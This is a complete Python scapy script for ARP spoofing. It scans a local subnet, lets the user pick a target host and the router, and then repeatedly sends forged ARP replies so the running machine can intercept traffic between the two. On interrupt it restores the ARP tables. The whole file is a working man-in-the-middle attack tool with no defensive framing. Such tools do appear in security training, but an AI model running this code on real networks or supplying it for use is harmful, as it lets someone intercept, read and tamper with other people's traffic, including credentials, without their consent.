import scapy.all as scapy
import time

target_ip = ""
target_mac = ""
router_ip = ""
router_mac = ""

def restore(target_ip, target_mac, router_ip, router_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    scapy.send(packet, verbose=False)
    packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
    scapy.send(packet, verbose=False)
    print("[+] Resetting ARP Tables")


def get_details():
    ip = input(">> Enter the target ip range : ")
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered, unanswered = scapy.srp(arp_request_broadcast, timeout=2.5, verbose=False)

    print("Choice\tIP\t\t\t\tMAC Address\t\t")
    print("------------------------------------------")
    i = 0
    device_list = []
    for elements in answered:
        device_list.append({"choice": i, "ip": elements[1].psrc, "mac":elements[1].hwsrc})
        print(str(i) + "\t\t" + device_list[i]["ip"] + "\t\t\t\t" + device_list[i]["mac"])
        i+=1
    
    target = int(input(">> Select the target : "))
    router = int(input(">> Select the router : "))

    return (device_list[target], device_list[router])
    

def spoof(target, router):
    target_ip = target["ip"]
    target_mac = target["mac"]
    router_ip = router["ip"]
    router_mac = router["mac"]
    packets_sent = 0
    try:
        while True:
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
            scapy.send(packet, verbose=False)
            packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
            scapy.send(packet, verbose=False)
            packets_sent +=2
            print(f"\r[+] Packets sent : {packets_sent}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        restore(target_ip, target_mac, router_ip, router_mac)
        print("[+] Terminating program")


(target, router) = get_details()
spoof(target, router)
